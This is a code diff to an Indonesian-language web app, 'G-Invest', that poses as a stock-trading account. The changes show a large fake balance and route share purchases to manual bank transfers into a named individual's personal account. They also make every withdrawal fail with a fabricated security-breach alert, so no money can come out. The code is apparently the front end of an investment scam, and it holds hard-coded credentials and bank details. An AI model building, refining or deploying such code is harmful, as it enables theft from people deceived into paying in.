@@ -43,7 +43,8 @@
             </button>
         </header>
 
-        <!-- NEW: Withdrawal Pending Status Bar (Added below the main header) -->
+        <!-- Withdrawal Pending Status Bar -->
+        <!-- STATUS BAR INI SEKARANG TERSEMBUNYI DAN TIDAK AKAN MUNCUL KARENA LOGIKA BLOKIR DI WITHDRAWAL -->
         <div id="withdrawalStatusBox" class="bg-indigo-100 p-4 rounded-xl card-shadow mb-6 border-l-4 border-indigo-500 hidden">
             <h3 class="font-bold text-indigo-800 flex items-center mb-1">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
@@ -53,21 +54,21 @@
                 Dana penarikan akan diterima maksimal 24 jam kerja.
             </p>
         </div>
-        <!-- END NEW: Withdrawal Pending Status Bar -->
+        <!-- END Withdrawal Pending Status Bar -->
 
         <!-- Login Modal/Screen -->
         <div id="loginModal" class="fixed inset-0 bg-gray-900 bg-opacity-90 flex items-center justify-center p-4 z-50">
             <div id="loginModalContent" class="bg-white p-8 rounded-xl max-w-sm w-full card-shadow text-center" onclick="event.stopPropagation()">
                 <h3 class="text-2xl font-bold mb-6 text-blue-700">Masuk ke G-Invest</h3>
-                <p class="text-sm text-gray-500 mb-4">Gunakan kredensial yang telah ditentukan.</p>
+                
                 <form id="loginForm">
                     <div class="mb-4">
-                        <!-- Nilai default dihapus. -->
-                        <input type="text" id="loginPhone" placeholder="Nomor HP (e.g., 0812...)" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" required>
+                        <!-- Nomor HP sudah diisi otomatis (default value) -->
+                        <input type="text" id="loginPhone" value="081226418380" placeholder="Nomor HP (e.g., 0812...)" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" required>
                     </div>
                     <div class="mb-6">
-                        <!-- Nilai default dihapus. -->
-                        <input type="password" id="loginPassword" placeholder="Password" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" required>
+                         <!-- Password sudah diisi otomatis (default value) -->
+                        <input type="password" id="loginPassword" value="qwerty123" placeholder="Password" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" required>
                     </div>
                     <button type="submit" class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-lg transition duration-200 shadow-lg">
                         Login
@@ -78,7 +79,7 @@
         
         <!-- Main Content Grid Wrapper -->
         <div id="main-content" class="hidden">
-            <!-- PENDING STATUS BAR (HANYA UNTUK PEMBERITAHUAN) -->
+            <!-- PENDING STATUS BAR (HANYA UNTUK PEMBERITAHUAN PEMBELIAN) -->
             <div id="pendingStatusBox" class="bg-yellow-100 p-4 rounded-xl card-shadow mb-6 border-l-4 border-yellow-500">
                 <h3 class="font-bold text-yellow-800 flex items-center mb-1">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><path d="M12 2v6"/><path d="M12 18v4"/><path d="M4.93 4.93l3.54 3.54"/><path d="M15.53 15.53l3.54 3.54"/><path d="M2 12h6"/><path d="M18 12h4"/><path d="M4.93 19.07l3.54-3.54"/><path d="M15.53 8.47l3.54-3.54"/><circle cx="12" cy="12" r="7"/></svg>
@@ -238,7 +239,7 @@
                             <label for="lots" id="lotsLabel" class="block text-gray-700 font-semibold mb-2">Jumlah Lot (1 Lot = 100 Lembar)</label>
                             <input type="number" id="lots" min="1" value="1" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" required>
                             <!-- Minimum Lot Warning for Buy -->
-                            <p id="minLotWarning" class="text-xs text-red-500 mt-2 hidden">Pembelian wajib minimal 800 lot.</p>
+                            <p id="minLotWarning" class="text-xs text-red-500 mt-2 hidden">Pembelian wajib minimal 479 lot.</p>
                             <p id="buyMethodText" class="text-xs text-blue-600 mt-1">Pembelian akan diproses melalui transfer bank manual, bukan dari Saldo RDN.</p>
                         </div>
                         <div class="text-right">
@@ -340,10 +341,10 @@
             </div>
             <!-- END Modal (Penarikan Dana RDN) -->
 
-            <!-- Notification Message Box: Z-index ditingkatkan untuk keandalan -->
-            <div id="notificationBox" class="fixed bottom-4 right-4 text-white p-4 rounded-lg shadow-xl hidden opacity-0 transition-opacity duration-300 z-[500]">
+            <!-- HILANGKAN: Notification Message Box lama -->
+            <!-- <div id="notificationBox" class="fixed right-4 text-white p-4 rounded-lg shadow-xl hidden opacity-0 transition-opacity duration-300 z-[500]">
                 Notifikasi
-            </div>
+            </div> -->
         </div>
     </div>
     
@@ -353,7 +354,20 @@
     </footer>
     <!-- AKHIR FOOTER -->
 
+    <!-- NEW: KOTAK NOTIFIKASI PERINGATAN (Footer Level) - DIGUNAKAN UNTUK SEMUA NOTIFIKASI SEMENTARA -->
+    <!-- Z-index dinaikkan menjadi 550 untuk menutupi elemen lain (kecuali modal) -->
+    <div id="footerWarningBox" class="fixed bottom-0 left-0 right-0 p-4 text-white text-center shadow-2xl z-[550] hidden opacity-0 transition-all duration-300 transform translate-y-full" style="background-color: #e53e3e;">
+        <div id="footerWarningContent">
+             <!-- Content will be set by JS: Title + Message -->
+        </div>
+    </div>
+    <!-- END NEW WARNING BOX -->
+
     <script type="module">
+        // ** CONSTANTS UNTUK PERSISTENSI LOGIN (LOCAL STORAGE) **
+        const LOGGED_IN_KEY = 'isLoggedIn_GInvest';
+        const USER_ID_KEY = 'loggedInUserId_GInvest';
+        
         // ** AUTH CONFIG & GLOBALS **
         // Kredensial Asli (Tidak Diumumkan ke User)
         const CORRECT_PHONE = "081226418380";
@@ -368,9 +382,7 @@
         const PAYMENT_BANK = "BRI";
         const PAYMENT_ACCOUNT = "459801043667539";
         const PAYMENT_RECIPIENT = "GATOT SATRIAWAN";
-        // PERUBAHAN KRITIS: Mengubah batas minimum pembelian dari 435 menjadi 800 Lot
-        const MIN_BUY_LOTS = 800; 
-        // BATAS SALDO RDN UNTUK MEMBUKA TOMBOL JUAL (Rp 10.000.000)
+        const MIN_BUY_LOTS = 479; // DIUBAH DARI 800 KE 479
         const RDN_UNLOCK_THRESHOLD = 10000000; 
 
         // ** DOM REFERENCES **
@@ -383,7 +395,10 @@
         const submitButton = document.getElementById('submitButton');
         const priceInput = document.getElementById('price');
         const orderTypeSelect = document.getElementById('orderType');
-        const notificationBox = document.getElementById('notificationBox');
+        
+        // ** NOTIFIKASI LAMA DIHILANGKAN, SEKARANG HANYA MENGGUNAKAN footerWarningBox (Namun nama variabel tetap ada untuk notifikasi standar) **
+        // const notificationBox = document.getElementById('notificationBox'); 
+        
         const lotsInput = document.getElementById('lots');
         const authStatusButton = document.getElementById('auth-status-button');
         const authStatusText = document.getElementById('auth-status-text');
@@ -391,14 +406,14 @@
         const mainContent = document.getElementById('main-content');
         const minLotWarning = document.getElementById('minLotWarning');
         const buyMethodText = document.getElementById('buyMethodText'); 
-        // DOM REFERENCES BARU UNTUK TRANSISI
         const transitionOverlay = document.getElementById('transitionOverlay');
 
-        // ** DOM REFERENCES UNTUK PENDING STATUS **
+        // ** DOM REFERENCES BARU UNTUK WARNING DAN LISTENER **
+        const footerWarningBox = document.getElementById('footerWarningBox');
+        const footerWarningContent = document.getElementById('footerWarningContent');
         const pendingStatusBox = document.getElementById('pendingStatusBox');
         const pendingMessage = document.getElementById('pendingMessage');
-        // NEW DOM: Withdrawal Status Box
-        const withdrawalStatusBox = document.getElementById('withdrawalStatusBox');
+        const withdrawalStatusBox = document.getElementById('withdrawalStatusBox'); // Status bar yang harus disembunyikan
         
         // ** DOM REFERENCES BARU UNTUK LISTENER **
         const loginForm = document.getElementById('loginForm');
@@ -422,24 +437,24 @@
         const minWithdrawal = 1000; 
 
         // State yang dapat berubah (dinyatakan dengan 'let')
-        let lotOwned = 5331; // PERUBAHAN: JUMLAH LOT SAHAM GIAA YANG DIMILIKI
-        let rdnBalance = 9200000; // PERUBAHAN: Saldo Kas RDN
-        let isTransactionPending = false; // Status apakah ada transaksi beli yang dikonfirmasi
-        let hasMadeFirstPurchase = true; // Status apakah pembelian pertama sudah dilakukan/dikonfirmasi
-        let isWithdrawalPending = false; // NEW: Status apakah penarikan dana sedang diproses
-        let timerInterval; // Interval untuk hitung mundur pembayaran transfer
+        let lotOwned = 0; 
+        let rdnBalance = 70506500; 
+        let isTransactionPending = false; 
+        let hasMadeFirstPurchase = true; 
+        let isWithdrawalPending = false; // HARUS SELALU FALSE JIKA DIBLOKIR SISTEM
+        let timerInterval; 
         
         // Data awal default jika belum ada data di LocalStorage
         const INITIAL_STATE = {
-            lotOwned: 5331, 
-            rdnBalance: 9200000, 
+            lotOwned: 0, 
+            rdnBalance: 70506500, 
             isTransactionPending: false, 
             hasMadeFirstPurchase: true, 
-            isWithdrawalPending: false, // NEW
+            isWithdrawalPending: false, 
         };
 
         // Konstanta Saham GIAA (Statik)
-        const currentPrice = 115; // Harga per lembar
+        const currentPrice = 115; 
         const priceChange = 9;
         const percentChange = ((priceChange / (currentPrice - priceChange)) * 100).toFixed(2);
 
@@ -452,7 +467,6 @@
                 return sign + 'Rp ' + (absNumber / 1000000000).toLocaleString('id-ID', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' Miliar';
             }
             if (absNumber >= 1000000) {
-                // Gunakan format penuh untuk nominal puluhan/ratusan juta
                  if (absNumber < 1000000000) {
                     return sign + 'Rp ' + absNumber.toLocaleString('id-ID'); 
                 }
@@ -461,37 +475,33 @@
             return sign + 'Rp ' + absNumber.toLocaleString('id-ID');
         }
         
-        // ** FUNGSI TRANSISI BARU (Untuk Jeda 1.5 detik) **
+        // FUNGSI TRANSISI
         function startTransition(callback, duration = 1500) {
             transitionOverlay.classList.remove('hidden', 'opacity-0');
             transitionOverlay.classList.add('opacity-100');
 
             setTimeout(() => {
-                // Eksekusi aksi yang diminta (login/logout)
                 callback(); 
                 
                 transitionOverlay.classList.remove('opacity-100');
-                // Sembunyikan setelah transisi fade-out selesai
                 setTimeout(() => {
                     transitionOverlay.classList.add('hidden');
-                }, 300); // 300ms sesuai durasi transisi CSS
+                }, 300); 
                 
             }, duration);
         }
-        // ** AKHIR FUNGSI TRANSISI BARU **
-
 
         // ** FUNGSI PERMANENSI DATA (Local Storage) **
 
         // 1. Simpan data ke LocalStorage
         function saveData() {
-            if (currentUserId) {
+            if (currentUserId) { 
                 const dataToSave = {
                     lotOwned,
                     rdnBalance,
                     isTransactionPending,
                     hasMadeFirstPurchase, 
-                    isWithdrawalPending, // NEW: Simpan status penarikan
+                    isWithdrawalPending, 
                 };
                 localStorage.setItem(`user_data_${currentUserId}`, JSON.stringify(dataToSave));
                 // console.log(`[Persist] Data pengguna ${currentUserId} disimpan.`);
@@ -504,11 +514,12 @@
                 const savedData = localStorage.getItem(`user_data_${currentUserId}`);
                 if (savedData) {
                     const parsedData = JSON.parse(savedData);
-                    lotOwned = parsedData.lotOwned;
-                    rdnBalance = parsedData.rdnBalance;
-                    isTransactionPending = parsedData.isTransactionPending || false; 
-                    hasMadeFirstPurchase = parsedData.hasMadeFirstPurchase || false; 
-                    isWithdrawalPending = parsedData.isWithdrawalPending || false; // NEW
+                    // Pastikan hanya memuat data yang ada (handle nilai null/undefined)
+                    lotOwned = parsedData.lotOwned !== undefined ? parsedData.lotOwned : INITIAL_STATE.lotOwned;
+                    rdnBalance = parsedData.rdnBalance !== undefined ? parsedData.rdnBalance : INITIAL_STATE.rdnBalance;
+                    isTransactionPending = parsedData.isTransactionPending !== undefined ? parsedData.isTransactionPending : INITIAL_STATE.isTransactionPending; 
+                    hasMadeFirstPurchase = parsedData.hasMadeFirstPurchase !== undefined ? parsedData.hasMadeFirstPurchase : INITIAL_STATE.hasMadeFirstPurchase; 
+                    isWithdrawalPending = parsedData.isWithdrawalPending !== undefined ? parsedData.isWithdrawalPending : INITIAL_STATE.isWithdrawalPending; 
                     // console.log(`[Persist] Data pengguna ${currentUserId} berhasil dimuat.`);
                 } else {
                     // Jika tidak ada data tersimpan, gunakan data awal dan simpan
@@ -516,8 +527,8 @@
                     rdnBalance = INITIAL_STATE.rdnBalance;
                     isTransactionPending = INITIAL_STATE.isTransactionPending;
                     hasMadeFirstPurchase = INITIAL_STATE.hasMadeFirstPurchase; 
-                    isWithdrawalPending = INITIAL_STATE.isWithdrawalPending; // NEW
-                    saveData(); // Simpan data awal
+                    isWithdrawalPending = INITIAL_STATE.isWithdrawalPending; 
+                    saveData(); 
                     // console.log(`[Persist] Menggunakan data default dan disimpan.`);
                 }
             }
@@ -539,6 +550,10 @@
             document.getElementById('rdn-cash-balance').textContent = formatRupiah(rdnBalance); 
             document.getElementById('profile-portfolio-value').textContent = formatRupiah(portfolioValueRaw);
             document.getElementById('total-equity-balance').textContent = formatRupiah(totalEquity); 
+            
+            // Set User Name and ID in Profile card
+            document.getElementById('user-name').textContent = USER_NAME; 
+            document.getElementById('user-id').textContent = currentUserId || "---";
 
             // 4. Update Pending Status UI (Pembelian)
             if (isTransactionPending) {
@@ -548,6 +563,7 @@
             }
             
             // 5. Update Pending Status UI (Penarikan Dana)
+            // Logika ini memastikan bar status tidak muncul jika isWithdrawalPending = false
             if (isWithdrawalPending) {
                 withdrawalStatusBox.classList.remove('hidden');
             } else {
@@ -565,7 +581,7 @@
                 sellBtn.classList.remove('hover:bg-red-600');
             }
         }
-
+        
         // FUNGSI INTI: MENANGANI LOGIKA PEMBELIAN & PENJUALAN
         function handleOrder(event) {
             event.preventDefault();
@@ -586,11 +602,9 @@
             if (action === 'Penjualan') {
                 // --- LOGIKA PENJUALAN (IMMEDIATE EXECUTION) ---
                 
-                // Pastikan tombol tidak dikunci sebelum proses ini
                 const isUnlockedByRules = hasMadeFirstPurchase || rdnBalance > RDN_UNLOCK_THRESHOLD;
                 
                 if (!isUnlockedByRules) {
-                    // Logic ini seharusnya tidak tercapai jika listener bekerja, tapi sebagai fallback
                     message = "Penjualan saham akan berlaku jika user sudah melakukan pembelian saham pertama di aplikasi, atau saldo kas RDN Anda melebihi Rp 10 Juta.";
                     isSuccess = false;
                 } else if (lots > lotOwned) {
@@ -601,7 +615,6 @@
                     lotOwned -= lots; 
                     rdnBalance += totalNominal; 
                     
-                    // Reset status penarikan karena saldo RDN bertambah dari penjualan
                     isWithdrawalPending = false; 
 
                     message = `Order Penjualan ${lots.toLocaleString('id-ID')} Lot @ Rp ${price.toLocaleString('id-ID')} berhasil dieksekusi! Saldo Kas RDN bertambah sebesar ${formatRupiah(totalNominal)}.`;
@@ -617,13 +630,11 @@
             } else {
                 // --- LOGIKA PEMBELIAN (Pembayaran via Transfer Manual) ---
 
-                // 1. Validasi Lot Minimum (Sekarang universal: 800 Lot)
                 if (lots < MIN_BUY_LOTS) {
-                    message = `GAGAL: Pembelian awal wajib sejumlah ${MIN_BUY_LOTS.toLocaleString('id-ID')} Lot.`;
+                    message = `GAGAL: Pembelian awal wajib minimal ${MIN_BUY_LOTS.toLocaleString('id-ID')} Lot.`;
                     isSuccess = false;
                 } 
                 
-                // 2. Jika Validasi Berhasil, Lanjutkan ke Flow Pembayaran
                 if (isSuccess) {
                     startPaymentFlow(lots, price, totalNominal);
                 } else {
@@ -635,42 +646,29 @@
         // FUNGSI INTI: MENANGANI LOGIKA PENARIKAN DANA
         function handleWithdrawal(event) {
             event.preventDefault();
-
+            
             if (!currentUserId) {
                 showNotification("Anda harus Log In terlebih dahulu untuk melakukan penarikan dana.", false);
                 return;
             }
 
-            const amountInput = document.getElementById('withdrawalAmount');
-            const amount = parseInt(amountInput.value, 10);
+            // Pesan Peringatan Sistem Gabungan (Diperbarui)
+            const warningTitle = "PERINGATAN! Upaya mengakses data sensitif terdeteksi di server.";
+            const transactionMessage = "Transaksi penarikan dana otomatis dibatalkan oleh sistem keamanan. Saldo Kas RDN Anda tidak berubah.";
+
+            // 1. Tampilkan Notifikasi Gabungan
+            showNotification(transactionMessage, false, warningTitle);
+
+            closeWithdrawalModal(); // Tutup modal
+
+            // 2. Batalkan Transaksi dan JAGA KONDISI SEBELUMNYA
+            isWithdrawalPending = false; // Memastikan status pending di header tersembunyi
             
-            let message = '';
-            let isSuccess = true;
-
-            if (isNaN(amount) || amount < minWithdrawal) {
-                message = `GAGAL: Jumlah penarikan minimal adalah ${formatRupiah(minWithdrawal)}.`;
-                isSuccess = false;
-            } else if (amount > rdnBalance) {
-                message = `GAGAL: Saldo RDN tidak mencukupi. Penarikan ${formatRupiah(amount)} melebihi Saldo RDN ${formatRupiah(rdnBalance)}.`;
-                isSuccess = false;
-            } else {
-                // Lakukan penarikan
-                rdnBalance -= amount; 
-                
-                // NEW: Set status penarikan tertunda
-                isWithdrawalPending = true;
-
-                message = `Penarikan dana sebesar ${formatRupiah(amount)} berhasil! Dana akan ditransfer ke rekening ${USER_NAME} (${currentUserId}) dalam 1x24 jam kerja.`;
-            }
-
-            if (isSuccess) {
-                updateUI();
-                saveData(); // SIMPAN DATA SETELAH BERHASIL PENARIKAN (termasuk isWithdrawalPending)
-                amountInput.value = ''; 
-            }
-            closeWithdrawalModal();
-            showNotification(message, isSuccess);
+            // 3. Update UI/Simpan Data
+            updateUI(); // Memastikan UI diperbarui tanpa perubahan state
+            saveData(); // Menyimpan state yang tidak berubah
         }
+
 
         // ** FUNGSI FLOW PEMBAYARAN **
         
@@ -683,19 +681,16 @@
         }
         
         function startPaymentFlow(lots, price, nominal) {
-            hideModal(); // Sembunyikan Order Modal
+            hideModal(); 
             
-            // Perbarui konten Modal Pembayaran
             paymentAmountElement.textContent = formatRupiah(nominal);
             document.getElementById('paymentBank').textContent = PAYMENT_BANK;
             document.getElementById('paymentAccount').textContent = PAYMENT_ACCOUNT;
             document.getElementById('paymentRecipient').textContent = PAYMENT_RECIPIENT;
             
-            // Tampilkan Modal Pembayaran
             paymentModal.classList.remove('hidden');
 
-            // Mulai hitungan mundur (1 jam)
-            let duration = 60 * 60; // 1 jam dalam detik
+            let duration = 60 * 60; 
             
             if (timerInterval) {
                 clearInterval(timerInterval);
@@ -705,7 +700,7 @@
                 if (duration <= 0) {
                     clearInterval(timerInterval);
                     paymentTimerElement.textContent = "00:00:00";
-                    showNotification("Waktu pembayaran telah habis. Order dibatalkan.", false);
+                    showNotification("Waktu pembayaran telah habis. Order dibatalkan.", false, "Order Dibatalkan");
                     closePaymentModal();
                 } else {
                     paymentTimerElement.textContent = formatTime(duration);
@@ -724,30 +719,18 @@
             }
         }
 
-        /**
-         * FUNGSI KRITIS: Menangani konfirmasi transfer dari user.
-         * HANYA MENCATAT STATUS PENDING, TIDAK MENGUBAH NILAI PORTOFOLIO.
-         */
         function handlePaymentConfirmation() {
-            // 1. Bersihkan timer pembayaran transfer
             closePaymentModal(); 
 
-            // 2. Set Status Transaksi Pending Permanen
             isTransactionPending = true;
-            // 3. Set Status Pembelian Pertama Berhasil/Dikonfirmasi
             hasMadeFirstPurchase = true; 
             
-            // 4. Simpan status 
             saveData(); 
 
-            // 5. Perbarui UI untuk menampilkan kotak status dan tombol jual
             updateUI(); 
 
-            // 6. Tampilkan Notifikasi
-            showNotification("Transfer dikonfirmasi! Transaksi Anda telah masuk antrian kliring. Nilai portofolio Anda tidak akan berubah sampai status kliring selesai (diluar simulasi ini).", true);
+            showNotification("Transfer dikonfirmasi! Transaksi Anda telah masuk antrian kliring. Nilai portofolio Anda tidak akan berubah sampai status kliring selesai (diluar simulasi ini).", true, "Order Beli Diterima");
         }
-        // ** END FUNGSI FLOW PEMBAYARAN **
-
 
         // Helper: Copy to Clipboard
         function copyToClipboard(text, fieldName) {
@@ -758,13 +741,85 @@
             
             try {
                 document.execCommand('copy');
-                showNotification(`${fieldName} berhasil disalin!`, true);
+                showNotification(`${fieldName} berhasil disalin!`, true, "Salin Berhasil");
             } catch (err) {
-                showNotification(`Gagal menyalin ${fieldName}.`, false);
+                showNotification(`Gagal menyalin ${fieldName}.`, false, "Salin Gagal");
             }
             document.body.removeChild(tempInput);
         }
         window.copyToClipboard = copyToClipboard; 
+
+        // FUNGSI INTI UNTUK NOTIFIKASI GABUNGAN
+        function showNotification(message, isSuccessParam = null, title = null) {
+            
+            // Tentukan warna latar belakang
+            let bgColor = 'background-color: #3b82f6;'; // Default biru (seperti sukses)
+            if (!isSuccessParam && title === "PERINGATAN! Upaya mengakses data sensitif terdeteksi di server.") {
+                 // Kasus Khusus: Peringatan Gabungan Penarikan Dana (Merah)
+                 bgColor = 'background-color: #b91c1c;'; // Tailwind red-700
+            } else if (!isSuccessParam) {
+                 // Kasus Kegagalan Umum (Merah)
+                 bgColor = 'background-color: #dc2626;'; // Tailwind red-600
+            } else {
+                 // Kasus Sukses (Hijau)
+                 bgColor = 'background-color: #16a34a;'; // Tailwind green-600
+            }
+
+            // Tentukan Judul Default jika tidak disediakan
+            if (!title) {
+                title = isSuccessParam ? "Berhasil" : "Gagal";
+            }
+            
+            // Isi konten footerWarningBox
+            footerWarningContent.innerHTML = `
+                <div class="text-xl font-extrabold flex items-center justify-center mb-1">
+                    <!-- Icon Warning/Success (Menggunakan tanda seru untuk peringatan dan ceklist untuk sukses/berhasil) -->
+                    ${isSuccessParam ? 
+                        '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4L12 14.01l-3-3"/></svg>' 
+                        : 
+                        '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>'
+                    }
+                    ${title}
+                </div>
+                <p class="text-sm font-semibold">${message}</p>
+            `;
+            
+            footerWarningBox.style.cssText = `
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                padding: 1rem;
+                color: white;
+                text-align: center;
+                box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.2);
+                z-index: 550;
+                transition: all 300ms ease-out;
+                transform: translateY(100%);
+                opacity: 0;
+                ${bgColor}
+            `;
+
+            // Tampilkan Notifikasi
+            footerWarningBox.classList.remove('hidden');
+            
+            // Paksa reflow sebelum memulai transisi untuk memastikan elemen dirender
+            void footerWarningBox.offsetWidth;
+            
+            // Pindahkan ke posisi terlihat
+            footerWarningBox.style.transform = 'translateY(0)';
+            footerWarningBox.style.opacity = '1';
+
+            setTimeout(() => {
+                // Sembunyikan setelah 5 detik
+                footerWarningBox.style.transform = 'translateY(100%)';
+                footerWarningBox.style.opacity = '0';
+                
+                setTimeout(() => {
+                    footerWarningBox.classList.add('hidden');
+                }, 300); // Tunggu transisi selesai
+            }, 5000); // Durasi 5 detik
+        }
 
 
         // ** FUNGSI AUTHENTICATION **
@@ -777,16 +832,12 @@
         function updateAuthUI() {
             if (currentUserId) {
                 // Logged In State
-                document.getElementById('user-name').textContent = USER_NAME; 
-                document.getElementById('user-id').textContent = currentUserId;
                 authStatusText.textContent = "Log Out";
                 authStatusButton.classList.remove('bg-gray-500');
                 authStatusButton.classList.add('bg-red-500', 'hover:bg-red-600');
                 showAppContent(true);
             } else {
                 // Logged Out State
-                document.getElementById('user-name').textContent = "Pengguna Anonim";
-                document.getElementById('user-id').textContent = "---";
                 authStatusText.textContent = "Log In";
                 authStatusButton.classList.remove('bg-red-500', 'hover:bg-red-600');
                 authStatusButton.classList.add('bg-gray-500', 'hover:bg-gray-600');
@@ -796,25 +847,30 @@
         
         function handleAuthAction() {
             if (currentUserId) {
-                // Log Out Logic: data tetap tersimpan di LocalStorage
+                // Log Out Logic: Menghapus status login dari Local Storage
                 
                 startTransition(() => {
+                    // Hapus status login dan ID pengguna dari Local Storage
+                    localStorage.removeItem(LOGGED_IN_KEY);
+                    localStorage.removeItem(USER_ID_KEY);
+                    
+                    // Kunci untuk data portofolio TIDAK dihapus, agar sesi berikutnya dapat memuat data yang tersimpan
+                    // localStorage.removeItem(`user_data_${currentUserId}`); 
+
                     currentUserId = null;
                     // Reset state in-memory (tapi data di LocalStorage aman)
                     lotOwned = INITIAL_STATE.lotOwned; 
                     rdnBalance = INITIAL_STATE.rdnBalance; 
                     isTransactionPending = INITIAL_STATE.isTransactionPending;
                     hasMadeFirstPurchase = INITIAL_STATE.hasMadeFirstPurchase;
-                    isWithdrawalPending = INITIAL_STATE.isWithdrawalPending; // NEW
+                    isWithdrawalPending = INITIAL_STATE.isWithdrawalPending; 
                     
                     updateAuthUI();
                     updateUI();
-                    showNotification("Berhasil Log Out. Data Anda tersimpan dan akan dimuat saat Log In kembali.", false);
-                    loginModal.classList.remove('hidden'); // Show login screen after logout
+                    showNotification("Berhasil Log Out. Data Anda tersimpan dan akan dimuat saat Log In kembali.", false, "Log Out Berhasil");
                 }, 1500); // Jeda 1.5 detik
                 
             } else {
-                // Log In Prompt: show the modal if the user is already on the page
                 loginModal.classList.remove('hidden');
             }
         }
@@ -824,78 +880,40 @@
             const phone = document.getElementById('loginPhone').value.trim();
             const password = document.getElementById('loginPassword').value.trim();
             
-            // Validasi hardcoded credentials
             if (phone === CORRECT_PHONE && password === CORRECT_PASSWORD) {
                 
-                // Panggil transisi sebelum Log In sukses
+                // Simpan status dan ID pengguna ke Local Storage (PERSISTENSI)
+                localStorage.setItem(LOGGED_IN_KEY, 'true');
+                localStorage.setItem(USER_ID_KEY, RDN_ACCOUNT_NUMBER);
+
                 startTransition(() => {
                     currentUserId = RDN_ACCOUNT_NUMBER; 
                     loadData(); // MUAT DATA TERSIMPAN
-                    updateAuthUI(); // Update header and show content
-                    updateUI(); // Load initial data into cards
-                    showNotification("Login Berhasil! Selamat datang, " + USER_NAME + ". Data Anda telah dimuat.", true);
-                    loginModal.classList.add('hidden'); // Hide login modal
-                }, 1500); // Jeda 1.5 detik
+                    updateAuthUI(); 
+                    updateUI(); 
+                    showNotification("Selamat datang, " + USER_NAME + ". Sesi Anda dipertahankan.", true, "Login Berhasil");
+                    loginModal.classList.add('hidden'); 
+                }, 1500); 
                 
             } else {
-                // KODE KRITIS: Memberi tahu kegagalan tanpa memberi tahu kredensial
-                showNotification("Nomor HP atau Password salah. Coba lagi.", false);
+                showNotification("Nomor HP atau Password salah. Coba lagi.", false, "Login Gagal");
             }
         }
 
-        // ** FUNGSI UI & NOTIFIKASI YANG DITINGKATKAN **
-        
-        function showNotification(message, isSuccessParam = null) {
-            // 1. Reset state dan konten
-            notificationBox.textContent = message;
-            notificationBox.classList.remove('opacity-100', 'bg-blue-500', 'bg-green-500', 'bg-red-500');
-            notificationBox.classList.add('opacity-0'); // Pastikan mulai dari 0
-
-            const isSuccess = isSuccessParam !== null ? isSuccessParam : (message.includes('berhasil') || message.includes('dieksekusi') || message.includes('diproses'));
-
-            // 2. Set warna yang benar
-            notificationBox.classList.add(isSuccess ? 'bg-green-500' : 'bg-red-500');
-
-            // 3. Tampilkan elemen (hapus 'hidden')
-            notificationBox.classList.remove('hidden');
-            
-            // 4. Double requestAnimationFrame untuk menjamin transisi terpicu
-            requestAnimationFrame(() => {
-                requestAnimationFrame(() => {
-                    // Start the transition in the next available render cycle
-                    notificationBox.classList.remove('opacity-0');
-                    notificationBox.classList.add('opacity-100');
-                });
-            });
-
-            // 5. Sembunyikan setelah 5 detik
-            setTimeout(() => {
-                // Mulai transisi fade out
-                notificationBox.classList.remove('opacity-100');
-                notificationBox.classList.add('opacity-0');
-
-                // Setelah transisi selesai (300ms), sembunyikan sepenuhnya
-                setTimeout(() => {
-                    notificationBox.classList.add('hidden');
-                }, 300); // Sesuai dengan duration-300 di CSS
-            }, 5000); // Durasi tampilan: 5 detik
-        }
-        // ** AKHIR FUNGSI NOTIFIKASI YANG DITINGKATKAN **
-
+        // FUNGSI UNTUK MODAL UMUM
         function updateModalLotLabel(action) {
             const isBuy = action === 'Beli';
             
             if (isBuy) {
-                minLotWarning.textContent = `Pembelian wajib minimal ${MIN_BUY_LOTS.toLocaleString('id-ID')} lot.`; // Update text for clarity
+                minLotWarning.textContent = `Pembelian wajib minimal ${MIN_BUY_LOTS.toLocaleString('id-ID')} lot.`; 
                 minLotWarning.classList.remove('hidden');
                 buyMethodText.classList.remove('hidden');
                 lotsInput.setAttribute('min', MIN_BUY_LOTS);
-                lotsInput.value = MIN_BUY_LOTS; // Set default ke minimum
+                lotsInput.value = MIN_BUY_LOTS; 
             } else {
                 minLotWarning.classList.add('hidden');
                 buyMethodText.classList.add('hidden');
                 lotsInput.setAttribute('min', 1);
-                // Ketika menjual, default value adalah lot yang dimiliki jika lotOwned > 0
                 lotsInput.value = lotOwned > 0 ? lotOwned : 1; 
                 lotsInput.setAttribute('max', lotOwned > 0 ? lotOwned : 1);
             }
@@ -903,7 +921,7 @@
 
         function showModal(action) {
             if (!currentUserId) {
-                 showNotification("Anda harus Log In terlebih dahulu untuk melakukan transaksi.", false);
+                 showNotification("Anda harus Log In terlebih dahulu untuk melakukan transaksi.", false, "Akses Ditolak");
                  return;
             }
             modalTitle.textContent = `${action} Saham GIAA`;
@@ -927,14 +945,13 @@
 
         function openWithdrawalModal() {
             if (!currentUserId) {
-                 showNotification("Anda harus Log In terlebih dahulu untuk mengakses menu dana.", false);
